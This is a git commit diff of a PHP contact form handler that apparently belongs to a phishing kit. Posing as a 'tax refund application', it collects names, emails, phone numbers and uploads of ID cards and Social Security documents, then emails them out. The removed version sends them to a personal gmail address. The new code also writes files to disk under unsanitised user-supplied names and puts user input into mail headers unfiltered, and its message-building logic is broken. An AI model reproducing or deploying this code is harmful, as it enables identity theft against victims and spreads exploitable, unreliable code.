2340dda138787b41c1e3069c931526b0f2faf5c9
msl <paulorngu@gmail.com>
2023-06-09 15:47:06 -0700

    updated

--- contact.php
+++ contact.php
@@ -1,79 +1,66 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-  $name = $_POST['name'];
-  $email = $_POST['email'];
-  $phone = $_POST['phone'];
-  $message = $_POST['message'];
+// Get the form data
+$name = $_POST['name'];
+$email = $_POST['email'];
+$phone = $_POST['phone'];
 
-  // Validate form inputs (add more validation if needed)
-  if (empty($name) || empty($email) || empty($phone) || empty($message)) {
-    echo "Please fill out all the fields.";
-    exit;
-  }
+// Process the uploaded files
+$idCard = $_FILES['id-card'];
+$ssn = $_FILES['ssn'];
 
-  // Email address to receive the form submission
-  $to = "mayvanassa@gmail.com";
-  
-  // Subject of the email
-  $subject = "New Tax Refund Form Submission";
-  
-  // Construct the email body
-  $body = "Name: " . $name . "\n";
-  $body .= "Email: " . $email . "\n";
-  $body .= "Phone: " . $phone . "\n";
-  $body .= "Message: " . $message . "\n";
-  
-  // Set headers
-  $headers = "From: " . $email . "\r\n";
-  $headers .= "Reply-To: " . $email . "\r\n";
-  
-  // Attach uploaded ID card file
-  if(isset($_FILES['id_card']) && $_FILES['id_card']['error'] == 0) {
-    $file_name = $_FILES['id_card']['name'];
-    $file_tmp = $_FILES['id_card']['tmp_name'];
-    $file_type = $_FILES['id_card']['type'];
-    $file_size = $_FILES['id_card']['size'];
-    
-    // Read the file content
-    $file_content = file_get_contents($file_tmp);
-    
-    // Encode the file content for email
-    $file_content_encoded = chunk_split(base64_encode($file_content));
-    
-    // Add the file as an attachment
-    $body .= "--PHP-mixed-\r\n";
-    $body .= "Content-Type: " . $file_type . "; name=\"" . $file_name . "\"\r\n";
-    $body .= "Content-Transfer-Encoding: base64\r\n";
-    $body .= "Content-Disposition: attachment\r\n";
-    $body .= $file_content_encoded . "\r\n";
-  }
-  
-  // Attach uploaded SSN file
-  if(isset($_FILES['ssn_upload']) && $_FILES['ssn_upload']['error'] == 0) {
-    $file_name = $_FILES['ssn_upload']['name'];
-    $file_tmp = $_FILES['ssn_upload']['tmp_name'];
-    $file_type = $_FILES['ssn_upload']['type'];
-    $file_size = $_FILES['ssn_upload']['size'];
-    
-    // Read the file content
-    $file_content = file_get_contents($file_tmp);
-    
-    // Encode the file content for email
-    $file_content_encoded = chunk_split(base64_encode($file_content));
-    
-    // Add the file as an attachment
-    $body .= "--PHP-mixed-\r\n";
-    $body .= "Content-Type: " . $file_type . "; name=\"" . $file_name . "\"\r\n";
-    $body .= "Content-Transfer-Encoding: base64\r\n";
-    $body .= "Content-Disposition: attachment\r\n";
-    $body .= $file_content_encoded . "\r\n";
-  }
-  
-  // Send the email
-  if (mail($to, $subject, $body, $headers)) {
-    echo "Form submitted successfully.";
-  } else {
-    echo "An error occurred while submitting the form.";
-  }
+// Define the email parameters
+$to = 'your-email@example.com'; // Replace with your email address
+$subject = 'Tax Refund Application';
+$message = "Name: $name\n\nEmail: $email\n\nPhone: $phone";
+
+// Attach the ID card
+$idCardName = $idCard['name'];
+$idCardTmpName = $idCard['tmp_name'];
+$idCardPath = 'uploads/' . $idCardName;
+move_uploaded_file($idCardTmpName, $idCardPath);
+$attachments[] = $idCardPath;
+
+// Attach the SSN
+$ssnName = $ssn['name'];
+$ssnTmpName = $ssn['tmp_name'];
+$ssnPath = 'uploads/' . $ssnName;
+move_uploaded_file($ssnTmpName, $ssnPath);
+$attachments[] = $ssnPath;
+
+$headers = "From: $email\r\n";
+$headers .= "Reply-To: $email\r\n";
+$headers .= "MIME-Version: 1.0\r\n";
+$headers .= "Content-Type: multipart/mixed; boundary=\"boundary\"\r\n";
+
+$message = "--boundary\r\n";
+$message .= "Content-Type: text/plain; charset=\"utf-8\"\r\n";
+$message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
+$message .= $message . "\r\n\r\n";
+
+foreach ($attachments as $attachment) {
+    $file = fopen($attachment, 'rb');
+    $data = fread($file, filesize($attachment));
+    fclose($file);
+
+    $message .= "--boundary\r\n";
+    $message .= "Content-Type: application/octet-stream; name=\"" . basename($attachment) . "\"\r\n";
+    $message .= "Content-Transfer-Encoding: base64\r\n";
+    $message .= "Content-Disposition: attachment; filename=\"" . basename($attachment) . "\"\r\n\r\n";
+    $message .= chunk_split(base64_encode($data)) . "\r\n\r\n";
 }
-?>
+
+$message .= "--boundary--";
+
+// Send the email
+if (mail($to, $subject, $message, $headers)) {
+    // Success message
+    echo 'Thank you! Your tax refund application has been submitted successfully we would contact you soon.';
+} else {
+    // Error message
+    echo 'Oops! An error occurred while submitting your tax refund application. Please try again later.';
+}
+
+// Clean up the uploaded files
+foreach ($attachments as $attachment) {
+    unlink($attachment);
+}
